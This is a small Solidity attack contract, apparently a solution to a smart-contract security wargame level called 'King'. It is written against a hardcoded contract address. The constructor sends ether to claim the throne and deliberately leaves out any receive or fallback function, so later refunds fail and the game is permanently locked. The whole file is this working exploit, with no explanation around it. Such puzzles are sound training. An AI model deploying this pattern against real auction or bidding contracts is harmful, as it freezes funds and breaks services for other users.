//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttacker {
    King kingContract =
        King(payable(0x01caa79CB256d09104578251A24F12D40F0ddE4d));
    uint256 balance;

    constructor() payable {
        balance = msg.value;
        (bool s, ) = address(kingContract).call{value: balance}("");
        require(s, "failed");
    }
}
